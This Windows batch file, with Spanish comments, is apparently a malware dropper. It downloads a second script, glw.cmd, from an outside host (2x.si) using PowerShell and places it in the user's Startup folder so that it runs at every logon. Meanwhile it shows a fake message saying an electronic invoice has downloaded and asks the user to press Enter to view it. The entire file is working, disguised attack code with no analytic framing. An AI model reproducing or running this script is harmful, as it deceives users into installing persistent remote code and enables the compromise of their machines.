@echo off
setlocal

REM Ruta de la carpeta de inicio (Startup) del usuario actual
set startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Nombre del archivo a mover
set fileName=glw.cmd

REM URL del archivo a descargar
set fileUrl=https://2x.si/glw.cmd

REM Descargar el archivo desde la URL
powershell -Command "Invoke-WebRequest -Uri %fileUrl% -OutFile %TEMP%\%fileName%"

if exist "%TEMP%\%fileName%" (
    echo Archivo descargado exitosamente.
    move "%TEMP%\%fileName%" "%startupPath%\%fileName%"
    echo Descargado Factura Electrónica
    echo Presione Enter para visualizar su factura.
) else (
    echo Error: No se pudo descargar el archivo.
)

pause
endlocal
